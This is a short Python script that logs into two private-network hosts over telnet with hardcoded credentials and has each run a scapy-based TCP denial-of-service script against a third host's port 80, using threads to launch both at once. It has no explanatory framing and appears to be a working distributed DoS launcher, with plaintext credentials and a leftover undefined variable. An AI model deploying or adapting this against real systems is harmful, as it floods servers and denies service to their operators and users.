
import telnetlib
import getpass
import threading

HOST = ["192.168.5.133","192.168.5.134"]
user = "usr"
password = "passwd"

# Define a function that will be executed in each thread
def thread_function(HOST):
    tn = telnetlib.Telnet()
    tn.open(HOST)
    tn.read_until(b"login: ")
    tn.write(user.encode("ascii")+b"\n")
    tn.read_until(b"Password: ")
    tn.write(password.encode("ascii")+b"\n")
    tn.write(b"cd /tmp \n")
    tn.write(b"sudo python3 Dos_scapy.py TCP 192.168.5.131 80\n")
    tn.read_until(b"[sudo] password for usr:")
    tn.write(password.encode("ascii")+b"\n")
    tn.write(b"exit\n")
    print(tn.read_all())
    tn.close()

    print(f"Thread {thread_number} finished")

# Create multiple threads
threads = []
for ip in HOST:
    t = threading.Thread(target=thread_function, args=(ip,))
    threads.append(t)

# Start the threads
for t in threads:
    t.start()
 



 


 

